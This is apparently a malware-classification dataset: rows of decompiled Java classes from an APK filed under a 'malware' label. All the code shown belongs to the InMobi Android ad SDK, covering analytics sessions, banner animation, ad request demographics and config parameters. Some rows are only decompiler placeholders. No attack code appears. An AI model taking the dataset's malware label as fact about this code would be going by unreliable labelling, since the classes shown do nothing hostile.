"msc_data/decompiled_malware_class/0013121BFDC7CC7E21401F95144EF56AF783F20477748E488725A1CFF68BB2B7\com.inmobi.analytics\InMobiAnalytics.code","public class InMobiAnalytics {   public static void startSessionManually(  Map<String,String> map){     if (InternalSDKUtil.isInitializedSuccessfully()) {       AnalyticsEventsWrapper.getInstance().startSession(InMobi.getAppId(),map);       AnalyticsEventsWrapper.setIsEventsUser();     }   }   public static void startSessionManually(){     startSessionManually(null);   }   public static void endSessionManually(  Map<String,String> map){     if (InternalSDKUtil.isInitializedSuccessfully()) {       AnalyticsEventsWrapper.getInstance().endSession(map);       AnalyticsEventsWrapper.setIsEventsUser();     }   }   public static void endSessionManually(){     endSessionManually(null);   }   public static void beginSection(  String str,  Map<String,String> map){     if (InternalSDKUtil.isInitializedSuccessfully()) {       try {         AnalyticsEventsWrapper.getInstance().beginSection(str.hashCode(),str,map);         AnalyticsEventsWrapper.setIsEventsUser();       }  catch (      Exception e) {         Log.debug(AnalyticsUtils.ANALYTICS_LOGGING_TAG,""Please pass a valid Section Name"");       }     }   }   public static void beginSection(  String str){     beginSection(str,null);   }   public static void endSection(  String str,  Map<String,String> map){     if (InternalSDKUtil.isInitializedSuccessfully()) {       try {         AnalyticsEventsWrapper.getInstance().endSection(str.hashCode(),str,map);         AnalyticsEventsWrapper.setIsEventsUser();       }  catch (      Exception e) {         Log.debug(AnalyticsUtils.ANALYTICS_LOGGING_TAG,""Please pass a valid Section Name"");       }     }   }   public static void endSection(  String str){     endSection(str,null);   }   public static void tagEvent(  String str,  Map<String,String> map){     if (InternalSDKUtil.isInitializedSuccessfully()) {       try {         AnalyticsEventsWrapper.getInstance().tagEvent(str,map);         AnalyticsEventsWrapper.setIsEventsUser();       }  catch (      Exception e) {         Log.internal(AnalyticsUtils.ANALYTICS_LOGGING_TAG,""Unable to tag event due to unexpected exception."",e);       }     }   }   public static void tagEvent(  String str){     tagEvent(str,null);   }   public static void tagTransactionManually(  Intent intent,  Bundle bundle){     if (InternalSDKUtil.isInitializedSuccessfully()) {       try {         AnalyticsEventsWrapper.getInstance().tagTransactionManually(intent,bundle);         AnalyticsEventsWrapper.setIsEventsUser();       }  catch (      Exception e) {         Log.internal(AnalyticsUtils.ANALYTICS_LOGGING_TAG,""Unable to tag transaction due to unexpected exception."",e);       }     }   }   public static void reportCustomGoal(  String str){     if (InternalSDKUtil.isInitializedSuccessfully()) {       try {         IMAdTracker.getInstance().reportCustomGoal(str);       }  catch (      Exception e) {         Log.internal(AnalyticsUtils.ANALYTICS_LOGGING_TAG,""Unable to report custom goal due to unexpected exception."",e);       }     }   } } "
"msc_data/decompiled_malware_class/0013121BFDC7CC7E21401F95144EF56AF783F20477748E488725A1CFF68BB2B7\com.inmobi.androidsdk\a.code","public class a {   private BannerView a;   private Animation.AnimationListener b;   public a(  BannerView bannerView,  Animation.AnimationListener animationListener){     this.a=bannerView;     this.b=animationListener;   }   public void a(  AnimationType animationType){     if (animationType == AnimationType.ANIMATION_ALPHA) {       AlphaAnimation alphaAnimation=new AlphaAnimation(0.0f,0.5f);       AlphaAnimation alphaAnimation2=new AlphaAnimation(0.5f,1.0f);       alphaAnimation.setDuration(1000L);       alphaAnimation.setFillAfter(false);       alphaAnimation.setAnimationListener(this.b);       alphaAnimation.setInterpolator(new DecelerateInterpolator());       alphaAnimation2.setDuration(500L);       alphaAnimation2.setFillAfter(false);       alphaAnimation2.setAnimationListener(this.b);       alphaAnimation2.setInterpolator(new DecelerateInterpolator());       this.a.a(alphaAnimation);       this.a.b(alphaAnimation2);     }  else     if (animationType == AnimationType.ROTATE_HORIZONTAL_AXIS) {       Rotate3dAnimation rotate3dAnimation=new Rotate3dAnimation(0.0f,90.0f,this.a.getWidth() / 2.0f,this.a.getHeight() / 2.0f,0.0f,true);       Rotate3dAnimation rotate3dAnimation2=new Rotate3dAnimation(270.0f,360.0f,this.a.getWidth() / 2.0f,this.a.getHeight() / 2.0f,0.0f,true);       rotate3dAnimation.setDuration(500L);       rotate3dAnimation.setFillAfter(false);       rotate3dAnimation.setAnimationListener(this.b);       rotate3dAnimation.setInterpolator(new AccelerateInterpolator());       rotate3dAnimation2.setDuration(500L);       rotate3dAnimation2.setFillAfter(false);       rotate3dAnimation2.setAnimationListener(this.b);       rotate3dAnimation2.setInterpolator(new DecelerateInterpolator());       this.a.a(rotate3dAnimation);       this.a.b(rotate3dAnimation2);     }  else     if (animationType == AnimationType.ROTATE_VERTICAL_AXIS) {       Rotate3dAnimationVert rotate3dAnimationVert=new Rotate3dAnimationVert(0.0f,90.0f,this.a.getWidth() / 2.0f,this.a.getHeight() / 2.0f,0.0f,true);       Rotate3dAnimationVert rotate3dAnimationVert2=new Rotate3dAnimationVert(270.0f,360.0f,this.a.getWidth() / 2.0f,this.a.getHeight() / 2.0f,0.0f,true);       rotate3dAnimationVert.setDuration(500L);       rotate3dAnimationVert.setFillAfter(false);       rotate3dAnimationVert.setAnimationListener(this.b);       rotate3dAnimationVert.setInterpolator(new AccelerateInterpolator());       rotate3dAnimationVert2.setDuration(500L);       rotate3dAnimationVert2.setFillAfter(false);       rotate3dAnimationVert2.setAnimationListener(this.b);       rotate3dAnimationVert2.setInterpolator(new DecelerateInterpolator());       this.a.a(rotate3dAnimationVert);       this.a.b(rotate3dAnimationVert2);     }     this.a.startAnimation(this.a.a());   } } !org.eclipse.jdt.core.dom.TypeDeclaration@2190fd9fpublic class a implements View.OnTouchListener {   a(){   }   @Override public boolean onTouch(  View view,  MotionEvent motionEvent){     if (motionEvent.getAction() == 1) {       view.setBackgroundColor(-7829368);       if (IMBrowserActivity.this.a.canGoBack()) {         IMBrowserActivity.this.a.goBack();       }  else {         IMBrowserActivity.this.finish();       }     }  else     if (motionEvent.getAction() == 0) {       view.setBackgroundColor(-16711681);     }     return true;   } } !org.eclipse.jdt.core.dom.TypeDeclaration@61cd00e"
"msc_data/decompiled_malware_class/0013121BFDC7CC7E21401F95144EF56AF783F20477748E488725A1CFF68BB2B7\com.inmobi.androidsdk\AdRequest.code","public class AdRequest {   private GenderType h;   private EducationType l;   private EthnicityType m;   private MaritalStatus q;   private String r;   private SexualOrientation s;   private HasChildren t;   private boolean a=true;   private Location b=null;   private String c=null;   private boolean d=false;   private String e=null;   private String f=null;   private Calendar g=null;   private String i=null;   private String j=null;   private int k=0;   private int n=0;   private String o=null;   private Map<String,String> p=null;   public enum IMIDType {  ID_LOGIN,   ID_SESSION}   public enum ErrorCode {  INVALID_REQUEST,   AD_DOWNLOAD_IN_PROGRESS,   AD_CLICK_IN_PROGRESS,   AD_FETCH_TIMEOUT,   AD_RENDERING_TIMEOUT,   NETWORK_ERROR,   INTERNAL_ERROR,   NO_FILL,   INVALID_APP_ID;   public int getErrorCode(){     int i=3;     if (this == AD_FETCH_TIMEOUT) {       i=1;     }     if (this == NETWORK_ERROR) {       return 2;     }     return i;   } }   public boolean isLocationInquiryAllowed(){     return this.a;   }   public void setLocationInquiryAllowed(  boolean z){     this.a=z;   }   public Location getCurrentLocation(){     return this.b;   }   public void setCurrentLocation(  Location location){     if (location != null) {       this.b=location;     }   }   public void setLocationWithCityStateCountry(  String str,  String str2,  String str3){     if (str != null && !"""".equals(str.trim())) {       this.c=str;     }     if (str2 != null && !"""".equals(str2.trim())) {       this.c+=""-"" + str2;     }     if (str3 != null && !"""".equals(str3.trim())) {       this.c+=""-"" + str3;     }   }   public void setLocationOfCityStateAndCountry(  String str){     if (str != null && !"""".equals(str.trim())) {       this.c=str;     }   }   public String getLocationWithCityStateCountry(){     return this.c;   }   @Deprecated public boolean isTestMode(){     return this.d;   }   @Deprecated public void setTestMode(  boolean z){     this.d=z;   }   public String getPostalCode(){     return this.e;   }   public void setPostalCode(  String str){     if (str != null && !"""".equals(str.trim())) {       this.e=str;     }   }   public String getAreaCode(){     return this.f;   }   public void setAreaCode(  String str){     if (str != null && !"""".equals(str.trim())) {       this.f=str;     }   }   public void setDateOfBirth(  Calendar calendar){     if (calendar != null) {       this.g=calendar;     }   }   public Calendar getDateOfBirth(){     return this.g;   }   public void setDateOfBirth(  Date date){     if (date != null) {       if (this.g == null) {         this.g=Calendar.getInstance();       }       this.g.setTime(date);     }   }   public GenderType getGender(){     return this.h;   }   public void setGender(  GenderType genderType){     this.h=genderType;   }   public String getKeywords(){     return this.i;   }   public void setKeywords(  String str){     if (str != null && !"""".equals(str.trim())) {       this.i=str;     }   }   public String getSearchString(){     return this.j;   }   public void setSearchString(  String str){     if (str != null && !"""".equals(str.trim())) {       this.j=str;     }   }   public int getIncome(){     return this.k;   }   public void setIncome(  int i){     this.k=i;   }   public EducationType getEducation(){     return this.l;   }   public void setEducation(  EducationType educationType){     this.l=educationType;   }   public EthnicityType getEthnicity(){     return this.m;   }   public void setEthnicity(  EthnicityType ethnicityType){     this.m=ethnicityType;   }   public int getAge(){     return this.n;   }   public void setAge(  int i){     if (i >= 0) {       this.n=i;     }   }   public String getInterests(){     return this.o;   }   public void setInterests(  String str){     if (str != null && !"""".equals(str.trim())) {       this.o=str;     }   }   public Map<String,String> getRequestParams(){     return this.p;   }   public void setRequestParams(  Map<String,String> map){     if (map != null) {       if (this.p == null) {         this.p=new HashMap();       }       for (      String str : map.keySet()) {         this.p.put(str,map.get(str));       }     }   }   public MaritalStatus getMaritalStatus(){     return this.q;   }   public void setMaritalStatus(  MaritalStatus maritalStatus){     this.q=maritalStatus;   }   public String getLanguage(){     return this.r;   }   public void setLanguage(  String str){     if (str != null && !"""".equals(str.trim())) {       this.r=str;     }   }   public SexualOrientation getSexualOrientation(){     return this.s;   }   public void setSexualOrientation(  SexualOrientation sexualOrientation){     this.s=sexualOrientation;   }   public void setHasChildren(  HasChildren hasChildren){     this.t=hasChildren;   }   public HasChildren getHasChildren(){     return this.t;   } } "
"msc_data/decompiled_malware_class/0013121BFDC7CC7E21401F95144EF56AF783F20477748E488725A1CFF68BB2B7\com.inmobi.androidsdk\b.code","public class b implements IMWebView.IMWebViewListener {   final BannerView a;   public b(  BannerView bannerView){     this.a=bannerView;   }   @Override public void onExpandClose(){     this.a.a(Values.MESSAGE_RESIZE,(AdRequest.ErrorCode)null);   }   @Override public void onExpand(){     this.a.a(Values.MESSAGE_CLOSE,(AdRequest.ErrorCode)null);   }   @Override public void onLeaveApplication(){     this.a.a(Values.MESSAGE_SHOW,(AdRequest.ErrorCode)null);   }   @Override public void onError(){     BannerView.d dVar;     Log.debug(ConfigConstants.LOGGING_TAG,""Error loading ad "");     dVar=this.a.A;     dVar.sendEmptyMessage(111);   }   @Override public void onShowAdScreen(){     this.a.a(Values.MESSAGE_CLOSE,(AdRequest.ErrorCode)null);   }   @Override public void onDismissAdScreen(){     this.a.a(Values.MESSAGE_RESIZE,(AdRequest.ErrorCode)null);   }   @Override public void onResize(  ResizeDimensions resizeDimensions){     this.a.a(Values.MESSAGE_HIDE,(AdRequest.ErrorCode)null);   }   @Override public void onResizeClose(){     this.a.a(Values.MESSAGE_LEGACYEXPAND,(AdRequest.ErrorCode)null);   }   @Override public void onUserInteraction(  Map<String,String> map){     this.a.m.onBannerInteraction(this.a,map);   } } public class b implements Runnable {   b(){   }   @Override public void run(){     BannerView.this.disableHardwareAcceleration();   } } public class b implements View.OnTouchListener {   b(){   }   @Override public boolean onTouch(  View view,  MotionEvent motionEvent){     if (motionEvent.getAction() == 1) {       view.setBackgroundColor(-7829368);       if (IMBrowserActivity.this.a.canGoForward()) {         IMBrowserActivity.this.a.goForward();       }     }  else     if (motionEvent.getAction() == 0) {       view.setBackgroundColor(-16711681);     }     return true;   } } static class b {   static final int[] a=new int[AdRequest.ErrorCode.values().length]; static {     try {       a[AdRequest.ErrorCode.AD_CLICK_IN_PROGRESS.ordinal()]=1;     }  catch (    NoSuchFieldError e) {     }     try {       a[AdRequest.ErrorCode.AD_DOWNLOAD_IN_PROGRESS.ordinal()]=2;     }  catch (    NoSuchFieldError e2) {     }   } } "
"msc_data/decompiled_malware_class/0013121BFDC7CC7E21401F95144EF56AF783F20477748E488725A1CFF68BB2B7\com.inmobi.androidsdk\BannerView.code","!org.eclipse.jdt.core.dom.TypeDeclaration@73b0fcbd"
"msc_data/decompiled_malware_class/0013121BFDC7CC7E21401F95144EF56AF783F20477748E488725A1CFF68BB2B7\com.inmobi.androidsdk\BannerViewListener.code","public interface BannerViewListener {   void onAdRequestCompleted(  BannerView bannerView);   void onAdRequestFailed(  BannerView bannerView,  AdRequest.ErrorCode errorCode);   void onBannerInteraction(  BannerView bannerView,  Map<String,String> map);   void onDismissAdScreen(  BannerView bannerView);   void onLeaveApplication(  BannerView bannerView);   void onShowAdScreen(  BannerView bannerView); } "
"msc_data/decompiled_malware_class/0013121BFDC7CC7E21401F95144EF56AF783F20477748E488725A1CFF68BB2B7\com.inmobi.androidsdk\c.code","static class c {   static final int[] a=new int[AdRequest.ErrorCode.values().length]; static {     try {       a[AdRequest.ErrorCode.AD_CLICK_IN_PROGRESS.ordinal()]=1;     }  catch (    NoSuchFieldError e) {     }     try {       a[AdRequest.ErrorCode.AD_DOWNLOAD_IN_PROGRESS.ordinal()]=2;     }  catch (    NoSuchFieldError e2) {     }     try {       a[AdRequest.ErrorCode.NO_FILL.ordinal()]=3;     }  catch (    NoSuchFieldError e3) {     }     try {       a[AdRequest.ErrorCode.INVALID_APP_ID.ordinal()]=4;     }  catch (    NoSuchFieldError e4) {     }   } } public class c implements HttpRequestCallback {   final BannerView a;   public c(  BannerView bannerView){     this.a=bannerView;   }   @Override public void notifyResult(  int i,  Object obj){     BannerView.d dVar;     AdRequest.ErrorCode errorCode;     BannerView.d dVar2;     Log.debug(ConfigConstants.LOGGING_TAG,"">>> Got HTTP REQUEST callback. Status: "" + i);     if (i == 0) {       this.a.k=((Response)obj).getAdResponse();       this.a.l=((Response)obj).getImpressionId();       dVar2=this.a.A;       dVar2.sendEmptyMessage(109);       return;     }     if (i == 1) {       long currentTimeMillis=System.currentTimeMillis() - this.a.s;       dVar=this.a.A;       Message obtainMessage=dVar.obtainMessage(110);       if (obj instanceof AdException) {         AdException adException=(AdException)obj;         AdRequest.ErrorCode errorCode2=adException.getErrorCode();         if (this.a.z) {           JSONObject jSONObject=new JSONObject();           try {             jSONObject.put(AdDatabaseHelper.TABLE_AD,adException.getImpressionId());             jSONObject.put(""t"",currentTimeMillis);             jSONObject.put(""m"",adException.getHttpCode());           }  catch (          JSONException e) {             Log.internal(ConfigConstants.LOGGING_TAG,""Error creating metric logs for error at "" + System.currentTimeMillis());           }           Initializer.getLogger().logEvent(new EventLog(NetworkEventType.RESPONSE_ERROR,jSONObject));         }         errorCode=errorCode2;       }  else {         errorCode=(AdRequest.ErrorCode)obj;         int errorCode3=errorCode.getErrorCode();         if (this.a.z) {           JSONObject jSONObject2=new JSONObject();           try {             jSONObject2.put(""t"",currentTimeMillis);             jSONObject2.put(""m"",errorCode3);           }  catch (          JSONException e2) {             Log.internal(ConfigConstants.LOGGING_TAG,""Error creating metric logs for error at "" + System.currentTimeMillis());           }           Initializer.getLogger().logEvent(new EventLog(NetworkEventType.CONNECT_ERROR,jSONObject2));         }       }       obtainMessage.obj=errorCode;       obtainMessage.sendToTarget();     }   } } public class c implements View.OnTouchListener {   c(){   }   @Override public boolean onTouch(  View view,  MotionEvent motionEvent){     if (motionEvent.getAction() == 1) {       view.setBackgroundColor(-7829368);       IMBrowserActivity.this.finish();     }  else     if (motionEvent.getAction() == 0) {       view.setBackgroundColor(-16711681);     }     return true;   } } !org.eclipse.jdt.core.dom.TypeDeclaration@499baf1a"
"msc_data/decompiled_malware_class/0013121BFDC7CC7E21401F95144EF56AF783F20477748E488725A1CFF68BB2B7\com.inmobi.androidsdk\d.code","public static class d extends Handler {   private final WeakReference<BannerView> a;   public d(  BannerView bannerView){     this.a=new WeakReference<>(bannerView);   }   @Override public void handleMessage(  Message message){     IMWebView iMWebView;     BannerView bannerView=this.a.get();     if (bannerView != null) {       try { switch (message.what) { case 101:           if (bannerView.z) {             long currentTimeMillis=System.currentTimeMillis() - bannerView.s;             JSONObject jSONObject=new JSONObject();             try {               jSONObject.put(AdDatabaseHelper.TABLE_AD,bannerView.l);               jSONObject.put(""t"",currentTimeMillis);             }  catch (            JSONException e) {               Log.internal(ConfigConstants.LOGGING_TAG,""Error creating metric logs for fetch_complete at "" + System.currentTimeMillis());             }             Initializer.getLogger().logEvent(new EventLog(NetworkEventType.RENDER_COMPLETE,jSONObject));           }         removeMessages(108);       if (bannerView.t) {         bannerView.e();         bannerView.t=false;         break;       }  else       if (bannerView.u == AnimationType.ANIMATION_OFF) {         bannerView.e();         break;       }  else {         bannerView.w.a(bannerView.u);         break;       } case Values.MESSAGE_CLOSE:     bannerView.b(false);   break; case Values.MESSAGE_SHOW: bannerView.a(Values.MESSAGE_RESIZE,(AdRequest.ErrorCode)null); break; case Values.MESSAGE_HIDE: bannerView.a(Values.MESSAGE_CLOSE,(AdRequest.ErrorCode)null); break; case Values.MESSAGE_LEGACYEXPAND: bannerView.a(Values.MESSAGE_SHOW,(AdRequest.ErrorCode)null); break; case Values.MESSAGE_GP_RUNNING: removeMessages(109); removeMessages(110); bannerView.y.doCancel(); long currentTimeMillis2=System.currentTimeMillis() - bannerView.s; if (bannerView.z) { JSONObject jSONObject2=new JSONObject(); try { jSONObject2.put(""t"",currentTimeMillis2); jSONObject2.put(""m"",1); }  catch (JSONException e2) { Log.internal(ConfigConstants.LOGGING_TAG,""Error creating metric logs for error at "" + System.currentTimeMillis()); } Initializer.getLogger().logEvent(new EventLog(NetworkEventType.CONNECT_ERROR,jSONObject2)); } bannerView.a(false); bannerView.a(101,AdRequest.ErrorCode.AD_FETCH_TIMEOUT); break; case 108: if (bannerView.z) { long currentTimeMillis3=System.currentTimeMillis() - bannerView.r; JSONObject jSONObject3=new JSONObject(); try { jSONObject3.put(AdDatabaseHelper.TABLE_AD,bannerView.l); jSONObject3.put(""t"",currentTimeMillis3); }  catch (JSONException e3) { Log.internal(ConfigConstants.LOGGING_TAG,""Error creating metric logs for fetch_complete at "" + System.currentTimeMillis()); } Initializer.getLogger().logEvent(new EventLog(NetworkEventType.RENDER_TIMEOUT,jSONObject3)); } removeMessages(111); removeMessages(101); bannerView.a(false); if (bannerView.i()) { iMWebView=bannerView.a; bannerView.a=null; }  else { iMWebView=bannerView.b; bannerView.b=null; } iMWebView.cancelLoad(); iMWebView.stopLoading(); iMWebView.deinit(); bannerView.a(101,AdRequest.ErrorCode.AD_RENDERING_TIMEOUT); break; case 109: long currentTimeMillis4=System.currentTimeMillis() - bannerView.s; if (bannerView.z) { JSONObject jSONObject4=new JSONObject(); try { jSONObject4.put(AdDatabaseHelper.TABLE_AD,bannerView.l); jSONObject4.put(""t"",currentTimeMillis4); }  catch (JSONException e4) { Log.internal(ConfigConstants.LOGGING_TAG,""Error creating metric logs for fetch_complete at "" + System.currentTimeMillis()); } Initializer.getLogger().logEvent(new EventLog(NetworkEventType.FETCH_COMPLETE,jSONObject4)); } removeMessages(Values.MESSAGE_GP_RUNNING); if (bannerView.k != null) { bannerView.k=bannerView.k.replace(""@__imm_aft@"","""" + currentTimeMillis4); } bannerView.a(bannerView.k); break; case 110: removeMessages(Values.MESSAGE_GP_RUNNING); bannerView.a(101,(AdRequest.ErrorCode)message.obj); bannerView.a(false); break; case 111: removeMessages(108); removeMessages(101); bannerView.a(101,AdRequest.ErrorCode.INTERNAL_ERROR); break; } }  catch (Exception e5) { Log.internal(ConfigConstants.LOGGING_TAG,""Exception hanlde message adview"",e5); } } super.handleMessage(message); } } public class d implements Animation.AnimationListener {   final BannerView a;   public d(  BannerView bannerView){     this.a=bannerView;   }   @Override public void onAnimationEnd(  Animation animation){     try {       try {         if (!animation.equals(this.a.a())) {           this.a.c(this.a.i() ? false : true);           this.a.a(false);           this.a.j();         }  else {           this.a.removeAllViews();           if (this.a.i()) {             try {               ((ViewGroup)this.a.a.getParent()).removeView(this.a.a);             }  catch (            Exception e) {             }             RelativeLayout.LayoutParams layoutParams=new RelativeLayout.LayoutParams(-1,-1);             this.a.c=this.a.a;             this.a.addView(this.a.a,layoutParams);           }  else {             try {               ((ViewGroup)this.a.b.getParent()).removeView(this.a.b);             }  catch (            Exception e2) {             }             RelativeLayout.LayoutParams layoutParams2=new RelativeLayout.LayoutParams(-1,-1);             this.a.c=this.a.b;             this.a.addView(this.a.b,layoutParams2);           }           this.a.startAnimation(this.a.b());         }         if (!animation.equals(this.a.a())) {           this.a.a(100,(AdRequest.ErrorCode)null);         }       }  catch (      Exception e3) {         Log.debug(ConfigConstants.LOGGING_TAG,""Error animating banner ads"",e3);         if (!animation.equals(this.a.a())) {           this.a.a(100,(AdRequest.ErrorCode)null);         }       }     }  catch (    Throwable th) {       if (!animation.equals(this.a.a())) {         this.a.a(100,(AdRequest.ErrorCode)null);       }       throw th;     }   }   @Override public void onAnimationRepeat(  Animation animation){   }   @Override public void onAnimationStart(  Animation animation){   } } public class d implements View.OnTouchListener {   d(){   }   @Override public boolean onTouch(  View view,  MotionEvent motionEvent){     if (motionEvent.getAction() == 1) {       view.setBackgroundColor(-7829368);       IMBrowserActivity.this.a.doHidePlayers();       IMBrowserActivity.this.a.reload();     }  else     if (motionEvent.getAction() == 0) {       view.setBackgroundColor(-16711681);     }     return true;   } } "
"msc_data/decompiled_malware_class/0013121BFDC7CC7E21401F95144EF56AF783F20477748E488725A1CFF68BB2B7\com.inmobi.androidsdk\e.code","public class e implements IMWebView.IMWebViewListener {   final InterstitialView a;   public e(  InterstitialView interstitialView){     this.a=interstitialView;   }   @Override public void onExpand(){   }   @Override public void onExpandClose(){   }   @Override public void onLeaveApplication(){     this.a.a(Values.MESSAGE_SHOW,(AdRequest.ErrorCode)null);   }   @Override public void onError(){     InterstitialView.c cVar;     Log.debug(ConfigConstants.LOGGING_TAG,""Error loading the interstitial ad "");     cVar=this.a.t;     cVar.sendEmptyMessage(310);   }   @Override public void onShowAdScreen(){     this.a.a(Values.MESSAGE_CLOSE,(AdRequest.ErrorCode)null);   }   @Override public void onDismissAdScreen(){     this.a.a(Values.MESSAGE_RESIZE,(AdRequest.ErrorCode)null);   }   @Override public void onResize(  ResizeDimensions resizeDimensions){   }   @Override public void onResizeClose(){   }   @Override public void onUserInteraction(  Map<String,String> map){     this.a.h.onInterstitialInteraction(this.a,map);   } } public class e implements View.OnTouchListener {   e(){   }   @Override public boolean onTouch(  View view,  MotionEvent motionEvent){     return true;   } } "
"msc_data/decompiled_malware_class/0013121BFDC7CC7E21401F95144EF56AF783F20477748E488725A1CFF68BB2B7\com.inmobi.androidsdk\f.code","public class f implements HttpRequestCallback {   final InterstitialView a;   public f(  InterstitialView interstitialView){     this.a=interstitialView;   }   @Override public void notifyResult(  int i,  Object obj){     InterstitialView.c cVar;     AdRequest.ErrorCode errorCode;     InterstitialView.c cVar2;     Log.debug(ConfigConstants.LOGGING_TAG,"">>> Got HTTP REQUEST callback. Status: "" + i);     if (i == 0) {       this.a.i=((Response)obj).getAdResponse();       this.a.n=((Response)obj).getImpressionId();       cVar2=this.a.t;       cVar2.sendEmptyMessage(308);       return;     }     if (i == 1) {       long currentTimeMillis=System.currentTimeMillis() - this.a.k;       cVar=this.a.t;       Message obtainMessage=cVar.obtainMessage(309);       if (obj instanceof AdException) {         AdException adException=(AdException)obj;         AdRequest.ErrorCode errorCode2=adException.getErrorCode();         if (this.a.r) {           JSONObject jSONObject=new JSONObject();           try {             jSONObject.put(AdDatabaseHelper.TABLE_AD,adException.getImpressionId());             jSONObject.put(""t"",currentTimeMillis);             jSONObject.put(""m"",adException.getHttpCode());           }  catch (          JSONException e) {             Log.internal(ConfigConstants.LOGGING_TAG,""Error creating metric logs for error at "" + System.currentTimeMillis());           }           Initializer.getLogger().logEvent(new EventLog(NetworkEventType.RESPONSE_ERROR,jSONObject));         }         errorCode=errorCode2;       }  else {         errorCode=(AdRequest.ErrorCode)obj;         int errorCode3=errorCode.getErrorCode();         if (this.a.r) {           JSONObject jSONObject2=new JSONObject();           try {             jSONObject2.put(""t"",currentTimeMillis);             jSONObject2.put(""m"",errorCode3);           }  catch (          JSONException e2) {             Log.internal(ConfigConstants.LOGGING_TAG,""Error creating metric logs for error at "" + System.currentTimeMillis());           }           Initializer.getLogger().logEvent(new EventLog(NetworkEventType.CONNECT_ERROR,jSONObject2));         }       }       obtainMessage.obj=errorCode;       obtainMessage.sendToTarget();     }   } } "
"msc_data/decompiled_malware_class/0013121BFDC7CC7E21401F95144EF56AF783F20477748E488725A1CFF68BB2B7\com.inmobi.androidsdk\g.code","class g extends WebViewClient {   final IMBrowserActivity a;   public g(  IMBrowserActivity iMBrowserActivity){     this.a=iMBrowserActivity;   }   @Override public void onPageStarted(  WebView webView,  String str,  Bitmap bitmap){     CustomView customView;     CustomView customView2;     CustomView customView3;     super.onPageStarted(webView,str,bitmap);     customView=this.a.g;     if (customView != null) {       customView2=this.a.g;       customView2.setSwitchInt(CustomView.SwitchIconType.FORWARD_INACTIVE);       customView3=this.a.g;       customView3.invalidate();     }   }   @Override public void onPageFinished(  WebView webView,  String str){     CustomView customView;     CustomView customView2;     CustomView customView3;     CustomView customView4;     CustomView customView5;     super.onPageFinished(webView,str);     customView=this.a.g;     if (customView != null) {       if (webView.canGoForward()) {         customView4=this.a.g;         customView4.setSwitchInt(CustomView.SwitchIconType.FORWARD_ACTIVE);         customView5=this.a.g;         customView5.invalidate();       }  else {         customView2=this.a.g;         customView2.setSwitchInt(CustomView.SwitchIconType.FORWARD_INACTIVE);         customView3=this.a.g;         customView3.invalidate();       }     }     CookieSyncManager.getInstance().sync();   } } "
"msc_data/decompiled_malware_class/0013121BFDC7CC7E21401F95144EF56AF783F20477748E488725A1CFF68BB2B7\com.inmobi.androidsdk\IMBrowserActivity.code","!org.eclipse.jdt.core.dom.TypeDeclaration@762504fe"
"msc_data/decompiled_malware_class/0013121BFDC7CC7E21401F95144EF56AF783F20477748E488725A1CFF68BB2B7\com.inmobi.androidsdk\InterstitialView.code","!org.eclipse.jdt.core.dom.TypeDeclaration@4e2c7456"
"msc_data/decompiled_malware_class/0013121BFDC7CC7E21401F95144EF56AF783F20477748E488725A1CFF68BB2B7\com.inmobi.androidsdk\InterstitialViewListener.code","public interface InterstitialViewListener {   void onAdRequestFailed(  InterstitialView interstitialView,  AdRequest.ErrorCode errorCode);   void onAdRequestLoaded(  InterstitialView interstitialView);   void onDismissAdScreen(  InterstitialView interstitialView);   void onInterstitialInteraction(  InterstitialView interstitialView,  Map<String,String> map);   void onLeaveApplication(  InterstitialView interstitialView);   void onShowAdScreen(  InterstitialView interstitialView); } "
"msc_data/decompiled_malware_class/0013121BFDC7CC7E21401F95144EF56AF783F20477748E488725A1CFF68BB2B7\com.inmobi.androidsdk.bootstrapper\a.code","class a implements CacheController.Validator {   @Override public boolean validate(  Map<String,Object> map){     boolean b;     b=Initializer.b((Map<String,Object>)map);     return b;   } } "
"msc_data/decompiled_malware_class/0013121BFDC7CC7E21401F95144EF56AF783F20477748E488725A1CFF68BB2B7\com.inmobi.androidsdk.bootstrapper\AppGalleryConfigParams.code","public class AppGalleryConfigParams {   String a=""http://appgalleries.inmobi.com/inmobi_sdk"";   public String getUrl(){     return this.a;   }   public void setFromMap(  Map<String,Object> map){     this.a=InternalSDKUtil.getStringFromMap(map,""url"");   } } "
"msc_data/decompiled_malware_class/0013121BFDC7CC7E21401F95144EF56AF783F20477748E488725A1CFF68BB2B7\com.inmobi.androidsdk.bootstrapper\ConfigParams.code","public class ConfigParams {   int a=20;   int b=60;   int c=60;   int d=60;   IMAIConfigParams e=new IMAIConfigParams();   MetricConfigParams f=new MetricConfigParams();   UID g=new UID();   AppGalleryConfigParams h=new AppGalleryConfigParams();   NativeConfigParams i=new NativeConfigParams();   public int getMinimumRefreshRate(){     return this.a;   }   public int getDefaultRefreshRate(){     return this.b;   }   public int getFetchTimeOut(){     return this.c * 1000;   }   public int getRenderTimeOut(){     return this.d * 1000;   }   public IMAIConfigParams getImai(){     return this.e;   }   public MetricConfigParams getMetric(){     return this.f;   }   public UID getUID(){     return this.g;   }   public AppGalleryConfigParams getAppAppGalleryConfigParams(){     return this.h;   }   public NativeConfigParams getNativeSdkConfigParams(){     return this.i;   }   public void setFromMap(  Map<String,Object> map){     this.a=InternalSDKUtil.getIntFromMap(map,""mrr"",1,2147483647L);     this.b=InternalSDKUtil.getIntFromMap(map,""drr"",-1,2147483647L);     this.c=InternalSDKUtil.getIntFromMap(map,""fto"",1,2147483647L);     this.d=InternalSDKUtil.getIntFromMap(map,""rto"",1,2147483647L);     this.e.setFromMap((Map)map.get(""imai""));     this.f.setFromMap((Map)map.get(""metric""));     this.g.setFromMap((Map)map.get(""ids""));     this.h.setFromMap((Map)map.get(""ag""));     this.i.setFromMap((Map)map.get(""native""));   } } "
